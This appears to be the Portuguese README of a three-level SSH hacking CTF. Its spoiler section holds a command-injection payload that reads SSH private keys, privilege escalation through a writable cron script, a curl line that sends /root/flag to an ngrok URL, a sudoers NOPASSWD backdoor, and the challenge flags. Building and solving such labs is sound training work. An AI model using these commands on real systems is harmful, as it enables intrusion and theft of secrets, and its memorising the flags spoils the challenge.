# ssh-game
Repositorio com objetivo de armazenar desafio de hacking relacionado a SSH

## nivel 1
Neste nível, o objetivo é que as pessoas possam navegar em uma interface que se pareça com um roteador.
Até encontrarem uma ferramenta de ping, que utiliza  command line para executar o teste.
Através disto, serão desafiadas a encontrar as chaves de conexão SSH do roteador, seguindo para o desafio nivel 2.
Terá uma flag no arquivo id_rsa, o mais importante para este momento.

## nivel 2
Este nível, é quase uma extensão, em termos de dificuldade, do nível 1.
A pessoa que obtiver as chaves, deverá trazê-las para sua máquina, modificar o nível de permissionamento deste (caso exista, se tratando de windows, isso não faz a menor diferença) e, depois, utilizar para conectar-se via SSH ao pseudo-roteador.
Após os passos descritos acima, é necessário montar o ambiente necessário para conexão via SSH, se for Windows, basta utilizar o Putty, se Linux, já existirá o ssh client nativo.
Ao obter a conexão, será exibido um BANNER de login com algumas instruções e a próxima flag.

## nivel 3
Este nível, é o mais difícil e aqui está como finalização, após este o comprometimento da máquina se dá por completo.
A pessoa que estiver jogando, será convidada a ler o conteúdo do arquivo /root/flag.
Para isso, será necessário realizar um privilege escalation através de uma tarefa cron.
Com isso, será demonstrado que, é possível ler uma tabela cron e saber se existem scripts desprotegidos e sendo executados como root.

## O que preciso instalar?
  * Docker
    Estes desafios estão FORTEMENTE acoplados a [Docker](https://docs.docker.com/get-docker/) e [Docker Compose](https://docs.docker.com/compose/install/). 
    O desafio 2 considera que existe Docker localmente para que possa iniciar sessões com experiência de SSH mas conectando-se ao tty e stdin dos containers executados.
  * Nodejs 12.x (via NVM ([linux](https://github.com/nvm-sh/nvm)/[windows](https://github.com/coreybutler/nvm-windows/releases)) ou [download direto](https://nodejs.org/en/))
  * SSH client (para Windows, [putty](https://www.putty.org/))
  * [AZ Cli](https://docs.microsoft.com/en-us/cli/azure/install-azure-cli)
  * Terraform (caso queira publicar a infra no Azure via AzureRM)

## Já instalei docker e docker-compose, o que faço agora?
Depois de ter instalado o que era necessário, basta rodar:
```bash
docker-compose build
docker-compose up
```

No caso de estar em ambiente Windows, o sock do docker é diferente, utilize:
```powershell
docker-compose -f docker-compose.windows.yml build
docker-compose -f docker-compose.windows.yml up
```

Os desafios estarão dispoíveis conforme descrito abaixo:
* nivel 1 - [http://localhost:4444](http://localhost:4444)
* nivel 2 - tcp://localhost:2222
* nivel 3 - usa a mesma conexão do nível 2

## Publicando na Azure
Após instalar `AZ Cli` e `terraform` de acordo com as recomendações para o seu sistema operacional, é necessário iniciar algumas etapas:
1. `az login` (para logar em sua conta, basta seguir o passo a passo ao abrir o navegador)
2. `az account show` (para verificar se está utilizando a subscription correta, para trocar veja este [link](https://docs.microsoft.com/en-us/cli/azure/account?view=azure-cli-latest#az_account_set))
3. Na pasta do terraform, `terraform init` (para baixar o provider do Azure, azurerm)
4. `terraform apply` (para que o terraform conecte no azure e crie o plano de provisionamento)
5. Existem duas variáveis para orientar o terraform a provisionar o ambiente na região correta da Azure e com o prefixo adequado, por padrão, tenho utilizado `var.location=brazilsouth` e `var.prefix=ssh-game` mas não são valores obrigatórios, sinta-se livre para mudar
6. Se estiver de acordo com o plano e a subscription usada, responda com `yes` ao prompt do `terraform`
7. Ao finalizar o provisionamento, o Public IP via `output`, do terraform, será exibido no terminal
8. Por enquanto, a publicação está sendo feita através de um simples git clone do meu repositório, ainda privado.
9. Quando este repositório virar público, não será mais necessário utilizar SSH para dar clone, serão removidas sessões de upload de chave SSH privada e alterado o clone para HTTPS

TLDR para o terraform (ainda precisa de login no `AZ Cli` 
```bash
terraform apply -auto-approve -var='location=brazilsouth' -var='prefix=ssh-game'
```
Leva em torno de 5 minutos para todos os recursos estarem provisionados e disponíveis ao uso.

## Não quero mais cobrança, quero destruir tudo isso ai lá na Azure 
```bash
terraform destroy -auto-approve -var='location=brazilsouth' -var='prefix=ssh-game'
```
Leva em torno de 5 minutos para destruir todos os recursos.


## Informações complementares
Para rodar estes desafios, será necessário ter ngrok instalado e, após isto, remapear, no `docker-compose.yml`, portas de nível root (80 e 22).
Portas altas foram usadas para não ser necessário qualquer privilégio administrativo enquanto desenvolvimento.
A experiência completa se baseia em parecer com um roteador de verdade, portanto, é necessário utilizar portas que sejam também usadas por tal.

### Usando Windows?
Algumas adaptações devem ser feitas para que o desafio seja bem sucedido:
- Ao colar a chave SSH no Notepad ou Visual Studio Code, quebre uma linha no fim do arquivo
- Ao salvar a chave, nomeie-a sem extensão ou extensões .txt ou .ppk
- Não use Putty como cliente SSH. Prefira o cliente SSH incluído no Windows 10 (Fall Creators Update ou mais recente), a partir do comando `ssh`


## ** SOLUÇÕES - ESTE ESPAÇO É PARA SPOILERS DO GAME, NÃO ABRA CASO QUEIRA JOGAR DE VERDADE **
<details><summary>TUDO BEM, ME MOSTRA LOGO COMO RESOLVE ESSA COISA TODA!</summary>
<p>

### Nivel 1
Para conseguir acesso às chaves, utilize comandos shell com `ls -la` e `cat` nos arquivos da pasta `.ssh` 
```bash
google.com && ls -la .ssh  && cat .ssh/id_rsa.pub && cat .ssh/id_rsa
```

FLAG: L3CTF{y0u_sh311_n0t_p4ss} 

### Nivel 2
Para conseguir uma flag, basta conectar-se via SSH na máquina.
A ideia é que a pessoa consiga entender o nome do usuário para logar (via chave pública, id_rsa.pub, no comentário do arquivo) e baixe o conteúdo da chave privada (id_rsa)
O IP já terá sido fornecido para as pessoas jogarem.
Abaixo, a chave privada foi criada em /tmp/id_rsa (copiar e colar conteúdo do nivel 1)
```bash
ssh -i /tmp/id_rsa -o StrictHostKeyChecking=no -p 22 temp_user@191.234.178.199
```

FLAG: L3CTF{y34h_y34h_g0t_th3_k3ys_n0t_th3_ch33s3_th3_k3ys}

### Nivel 3
Uma das possíveis soluções é, criar um arquivo `log.sh`, na home do temp_user para que faça um :
- cat /root/flag > /home/temp_user/flag.txt && chmod 777 /home/temp_user/flag.txt 
- curl -X POST --data-binary @/root/flag [URL_DO_NGROK] 
- echo "temp_user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
Qualquer uma destas soluções habilita a leitura do arquivo /root/flag
O arquivo log.sh pode ser descoberto através de um cat em /etc/crontab

FLAG: L3CTF{4r3_y0u_t3ll1ng_m3_y0u_h4ck3d_4_t1m3_m4ch1n3}

</p>
</details>

